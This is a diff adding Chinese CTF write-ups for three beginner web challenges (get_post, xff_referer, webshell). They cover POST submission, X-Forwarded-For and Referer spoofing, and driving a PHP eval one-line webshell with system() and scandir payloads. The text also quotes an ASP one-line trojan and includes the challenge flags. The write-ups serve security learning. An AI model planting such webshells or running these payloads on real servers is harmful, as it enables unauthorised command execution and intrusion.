@@ -181,6 +181,99 @@ if($b>1234){
 
 
 
+## get_post
+
++ 打开网页，看到一行字 “请用GET方式提交一个名为a,值为1的变量”。
+
++ 直接在 **URL** 后面加上 `?a=1` 即可。
+
++ 回车后又出现一行字 “请再以POST方式随便提交一个名为b,值为2的变量”。
+
++ **POST方法** 无法像 GET 方法一样直接在地址栏修改 URL 得到。解决方法有两种：
+
+  + 在火狐浏览器中安装插件 **hackbar** ，安装成功后按 **F12** ，可以看到导航栏的最后一项多了一个 **hackbar** 。此时先点击 **Load URL** ，然后再勾上 **Post data** 的勾选框，并在下方弹出的输入框中填上 `b=2`，最后点击 **Execute** 即可得到 flag。
+
+  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/get_post/1.png?raw=true)
+
+  + 使用 **Burpsuite** 。在使用 GET 方法收到显示了第二行字的新网页后，点击 **Send to Repeater** 。在 Repeater 中修改 Headers，把原来的 **GET** 改为 **POST** ，然后点击 **Send**，发现并没有得到 flag 。百度发现使用 POST 方法需要添加 **Content-Type** 和 **Content-Length** 字段，最后在 **raw** 中直接添加 `b=2` 才能成功。
+
+  ![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/get_post/2.png?raw=true)
+
++ flag: **cyberpeace{c9b6fecf90fe60bc102f5f4b45e249f8}**
+
+
+
+## xff_referer
+
++ 打开网页，发现一行很小的字 “ip地址必须为123.123.123.123” 。
+
++ 又要上 **Burpsuite** 了，用 Burpsuite 修改发送的数据，在 **Header** 中添加一行 `X-Forwarded-For: 123.123.123.123` ，使满足 IP 为 123.123.123.123 。
+
+  > **X-Forwarded-For**（**XFF**）是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。
+
++ 点击 **Send** 后发现多了一行 `<script>` 的内容：
+
+```html
+<script>
+    document.getElementById("demo").innerHTML="必须来自https://www.google.com";</script>
+```
+
++ 于是按照要求添加 **Referer** 的值：`Referer: https://www.google.com` ，即可得到 flag。
+
+  > 当浏览器向 web 服务器发送请求的时候，一般会带上 Referer ，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。
+  >
+  > Referer 的正确英语拼法是 referrer 。由于早期 HTTP 规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以拼法不统一。
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/xff_referer/1.png?raw=true)
+
++ flag: **cyberpeace{36017c947d347900bf6bc21882924614}**
+
+
+
+## webshell
+
++ 打开网页，看到如下内容：
+
+  > ### 你会使用webshell吗？
+  >
+  > <?php @eval($_POST['shell']);?>
+
++ 【来自解题过后的百度】关于 webshell ：
+
+  > + webshell 就是就是 web 的一个管理工具，可以对 web 服务器进行操作的权限，也叫 webadmin 。webshell 一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于 webshell 的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的 webshell 上传到 web 服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。
+  >
+  > + webshell 根据脚本可以分为 PHP 脚本， ASP 脚本，也有基于 .NET 的脚本和 JSP 脚本。在国外，还有用 Python 脚本语言写的动态网页，故也有与之相关的 webshell 。
+  >   根据功能也分为大马与小马，小马通常指的一句话木马，例如：`<%eval request(“pass”)%>` 通常把这句话写入一个文档里面，然后文件名改成 xx.asp 。然后传到服务器上面。这里 eval 方法将 request(“pass”) 转换成代码执行，request 函数的作用是应用外部文件，这相当于一句话木马的客户端配置。
+
++ 于是 **F12** ，用 **hackbar** 先点击 **Load URL** 再勾上 **Post data** 勾选框，然后开始倒腾...
+
++ ... （以下省略 N 多无效操作...）
+
++ 在 Post data 下面的输入框中输入 `shell=print_r(getcwd());` 在页面上打印出当前页面对应的 html 文件所在的目录。
+
+  > getcwd函数：获取当前工作目录
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/1.png?raw=true)
+
++ 页面显示当前目录为 `/var/www/html`，于是输入 `shell=print_r(scandir("/var/www/html"));` 在页面上打印出当前页面所在工作目录下的所有文件（及目录）。
+
+  > scandir函数：列出指定路径中的文件和目录
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/2.png?raw=true)
+
++ 页面显示内容为 `Array ( [0] => . [1] => .. [2] => flag.txt [3] => index.php ) <?php ` 。发现当前目录下隐藏着一个 **flag.txt** 文件，于是直接在 **URL** 后面加上 `/flag.txt` 即可访问 **flag.txt** 文件，得到 flag 。
++ 也可以输入 `shell=system("ls");` 在页面上打印出当前页面对应的 html 文件所在的目录，然后再输入 `shell=system('cat flag.txt');` 在页面上直接打印出 **flag.txt** 的内容。
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/3.png?raw=true)
+
+![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/webshell/4.png?raw=true)
+
++ ... （心态崩了，看来我的 PHP 需要回炉重学QAQ）
++ 这里最省事的方法其实是用工具 **“中国菜刀”** 或者 **“中国蚁剑”** ... 涨姿势了QAQ
++ flag: **cyberpeace{1314db684c1a2094dd83e1f495920623}**
+
+
+
 ## NewsCenter
 
 + 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：
